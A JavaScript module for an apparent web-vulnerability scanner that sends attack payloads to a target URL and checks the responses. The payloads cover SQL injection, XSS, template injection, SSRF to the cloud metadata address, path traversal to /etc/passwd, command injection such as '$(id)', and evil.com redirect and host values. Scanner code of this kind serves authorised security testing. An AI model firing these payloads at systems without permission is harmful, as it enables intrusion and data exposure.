/**
 * Active Probe Engine
 * 10 vulnerability probes that send actual requests to confirm vulnerabilities.
 * Each probe returns confirmed findings with evidence.
 */

const PROBES = {
  sqli: {
    name: 'SQL Injection',
    payloads: ["'", "' OR '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:5'--"],
    detect: (original, response) => {
      const errors = ['sql syntax', 'mysql_', 'pg_query', 'sqlite3', 'ORA-', 'unclosed quotation', 'SQLSTATE', 'microsoft sql'];
      const body = response.toLowerCase();
      return errors.some(e => body.includes(e) && !original.toLowerCase().includes(e));
    }
  },
  xss: {
    name: 'Cross-Site Scripting (Reflected)',
    payloads: ['<red7x7>', '"><red7x7>', "'-red7x7-'", '<img src=x onerror=red7x7>'],
    detect: (original, response) => response.includes('red7x7') && !original.includes('red7x7')
  },
  ssti: {
    name: 'Server-Side Template Injection',
    payloads: ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '{7*7}', '#{7*7}'],
    detect: (original, response) => response.includes('49') && !original.includes('49')
  },
  ssrf: {
    name: 'Server-Side Request Forgery',
    payloads: ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:80', 'http://[::1]/', 'http://0x7f000001/'],
    detect: (original, response) => {
      const indicators = ['ami-id', 'instance-id', 'iam/', 'meta-data', 'localhost', '127.0.0.1'];
      return indicators.some(i => response.includes(i) && !original.includes(i));
    }
  },
  lfi: {
    name: 'Local File Inclusion / Path Traversal',
    payloads: ['../../../etc/passwd', '....//....//....//etc/passwd', '..%2f..%2f..%2fetc%2fpasswd', '/etc/passwd%00', '..\\..\\..\\windows\\win.ini'],
    detect: (original, response) => {
      const signatures = ['root:x:0:', 'root:*:0:', '[extensions]', 'for 16-bit app'];
      return signatures.some(s => response.includes(s));
    }
  },
  cmdi: {
    name: 'OS Command Injection',
    payloads: ['; id', '| id', '`id`', '$(id)', '; whoami', '| cat /etc/hostname'],
    detect: (original, response) => {
      const indicators = ['uid=', 'gid=', 'groups=', 'root', 'www-data'];
      return indicators.some(i => response.includes(i) && !original.includes(i));
    }
  },
  open_redirect: {
    name: 'Open Redirect',
    payloads: ['https://evil.com', '//evil.com', '/\\evil.com', 'https:evil.com'],
    detect: (original, response, headers) => {
      const location = headers?.location || headers?.Location || '';
      return location.includes('evil.com');
    }
  },
  cors: {
    name: 'CORS Misconfiguration',
    // This probe sends Origin header and checks ACAO response
    payloads: ['https://evil.burpmax-test.com'],
    detect: (original, response, headers) => {
      const acao = headers?.['access-control-allow-origin'] || '';
      const acac = headers?.['access-control-allow-credentials'] || '';
      return acao.includes('evil.burpmax-test.com') || (acao === '*' && acac === 'true');
    }
  },
  host_header: {
    name: 'Host Header Injection',
    payloads: ['evil.com', 'evil.com:80', 'localhost'],
    detect: (original, response) => response.includes('evil.com') && !original.includes('evil.com')
  },
  csrf: {
    name: 'Cross-Site Request Forgery',
    payloads: [], // CSRF is detected by absence, not injection
    detect: (original, response, headers, method) => {
      if (!['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) return false;
      const body = response.toLowerCase();
      const hasToken = body.includes('csrf') || body.includes('_token') || body.includes('authenticity_token');
      return !hasToken;
    }
  }
};

/**
 * Run a single probe against a URL+parameter.
 * @param {string} probeName - e.g. 'sqli', 'xss'
 * @param {object} opts - { url, param, method, headers, originalResponse }
 * @returns {Promise<{ vulnerable: boolean, probe: string, evidence?: string, payload?: string }>}
 */
export async function runProbe(probeName, opts) {
  const probe = PROBES[probeName];
  if (!probe) return { vulnerable: false, probe: probeName, error: `Unknown probe: ${probeName}` };

  const { url, param, method = 'GET', headers = {}, originalResponse = '' } = opts;

  // CSRF is a special case — check original response
  if (probeName === 'csrf') {
    const vulnerable = probe.detect(originalResponse, originalResponse, headers, method);
    return { vulnerable, probe: probe.name, evidence: vulnerable ? `No CSRF token found on ${method} ${url}` : null };
  }

  for (const payload of probe.payloads) {
    try {
      // Build the request with injected payload
      let targetUrl = url;
      const fetchOpts = { method, headers: { 'User-Agent': 'RedCLI-Probe/1.0', ...headers }, redirect: 'manual' };

      if (method === 'GET' && param) {
        const u = new URL(url);
        u.searchParams.set(param, payload);
        targetUrl = u.toString();
      } else if (method === 'POST' && param) {
        fetchOpts.body = `${param}=${encodeURIComponent(payload)}`;
        fetchOpts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      } else if (probeName === 'cors') {
        fetchOpts.headers['Origin'] = payload;
      } else if (probeName === 'host_header') {
        fetchOpts.headers['Host'] = payload;
      } else if (param) {
        const u = new URL(url);
        u.searchParams.set(param, payload);
        targetUrl = u.toString();
      }

      const response = await fetch(targetUrl, fetchOpts);
      const body = await response.text();
      const respHeaders = {};
      response.headers.forEach((v, k) => { respHeaders[k] = v; });

      const vulnerable = probe.detect(originalResponse, body, respHeaders, method);
      if (vulnerable) {
        return {
          vulnerable: true,
          probe: probe.name,
          payload,
          evidence: body.slice(0, 500),
          url: targetUrl,
          param
        };
      }
    } catch {
      // Network error — skip this payload
    }
  }

  return { vulnerable: false, probe: probe.name };
}

/**
 * Run all probes against a URL+parameter.
 * @param {object} opts - { url, param, method, headers }
 * @returns {Promise<{ findings: Array, scanned: number }>}
 */
export async function runAllProbes(opts) {
  const findings = [];
  let originalResponse = '';

  // Fetch baseline response
  try {
    const resp = await fetch(opts.url, { headers: { 'User-Agent': 'RedCLI-Probe/1.0' } });
    originalResponse = await resp.text();
  } catch {}

  const probeNames = Object.keys(PROBES);
  for (const name of probeNames) {
    const result = await runProbe(name, { ...opts, originalResponse });
    if (result.vulnerable) {
      findings.push(result);
    }
  }

  return { findings, scanned: probeNames.length, url: opts.url, param: opts.param };
}

/**
 * Get list of available probes.
 */
export function listProbes() {
  return Object.entries(PROBES).map(([key, probe]) => ({
    id: key,
    name: probe.name,
    payloadCount: probe.payloads.length
  }));
}

export default { runProbe, runAllProbes, listProbes };
